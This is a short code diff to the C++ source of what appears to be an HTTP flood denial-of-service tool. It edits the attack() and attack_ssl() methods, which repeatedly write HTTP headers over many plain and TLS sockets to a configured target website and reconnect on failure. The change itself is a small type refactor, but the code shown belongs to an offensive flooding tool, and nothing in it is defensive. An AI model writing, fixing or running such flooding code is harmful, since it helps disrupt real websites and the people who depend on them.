@@ -1,6 +1,5 @@
 #include <netdb.h>
 #include <cstring>
-#include <utility>
 #include <unistd.h>
 #include <openssl/ssl.h>
 
@@ -128,7 +127,7 @@ void Http_Flood::attack() {
             }
             httphdr header{};
             init_header(&header);
-            if((write_socket(sockets[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
+            if((write_socket(sockets[x], header.get(), static_cast<int>(header.length()))) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
             }else{
@@ -164,7 +163,7 @@ void Http_Flood::attack_ssl() {
             }
             httphdr header{};
             init_header(&header);
-            if((write_socket(SSLs[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
+            if((write_socket(SSLs[x], header.get(), static_cast<int>(header.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
                 CTXs[x] = InitCTX();
